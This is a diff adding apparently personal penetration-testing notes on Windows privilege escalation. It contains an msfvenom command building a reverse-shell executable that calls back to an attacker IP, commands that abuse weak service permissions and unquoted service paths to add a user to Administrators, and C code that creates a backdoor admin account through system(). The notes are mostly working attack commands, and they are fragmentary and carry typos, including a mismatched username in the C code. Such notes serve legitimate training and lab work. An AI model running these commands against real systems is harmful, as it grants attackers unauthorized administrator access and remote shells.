@@ -1,0 +1,53 @@
+	• Escalation with admin command (Windows)
+	Similarly, if you can get a command to run with SYSTEM privileges on Windows, it’s usually a good idea to add yourself to the Administrators group with net localgroup Administrators offsec /add. However, on newer Windows machines, this may only give you “unelevated” administrator access, and you’ll be hamstrung by UAC and won’t be able to read the Administrator account’s files.
+	For me, the most successful command in these situations was a reverse shell executable:
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -e x86/shikata_ga_nai -f exe -o non_staged.exe
+	This worked after hours of trying to run netcat shells, playing around with the registry, and attempting to use PsExec -s, which all failed in various ways.
+------------------------------------------------------------------------------------------------------------------------------
+	• BinPath
+		▪ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+			• Cmd output: “SERVICE_CHANGE_CONFIG” permission.
+		▪ Cmd.exe: net user Ghuliev 
+			• Cmd.exe" Local group membership * Users
+		▪ Explotation
+			• Cmd.exe: sc config daclsvc binpath= "net localgroup administrators Ghuliev /add"
+			• Cmd.exe: sc start daclsvc
+			• Cmd.exe: net localgroup administrators
+	▪ DLL Hijacking 
+		▪  Sc qc dllsvc
+			• Output processname
+	
+	▪ Services (Unquoted Path)
+		▪ Cmd.exe: sc qc unquotedsvc
+		▪ Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
+		▪ Explotation 
+			• Kali Linux: msfvenom -p windows/exec CMD='net localgroup administrators ghuliev /add' -f exe-service -o common.exe
+		
+	▪ net user /domain
+	▪ Net group "domain admins" /domain
+	▪ Get-NetGroupMember
+	▪ 
+
+------------------------------------------------------------------------------------------------------------------------------
+	C code for useradd
+	
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+	
+int main ()
+
+		{
+  int i;
+		
+  i=system ("net user ihack4falafel <password> /add && net localgroup administrators ihack4falfel /add");
+  return 0;
+		
+}
+
+------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\user1\Desktop> accesschk.exe -ewcq "user" *
+
+OUTPUT
+
+RW daclsvc
+	SERVICE_QUERY_CONFIG
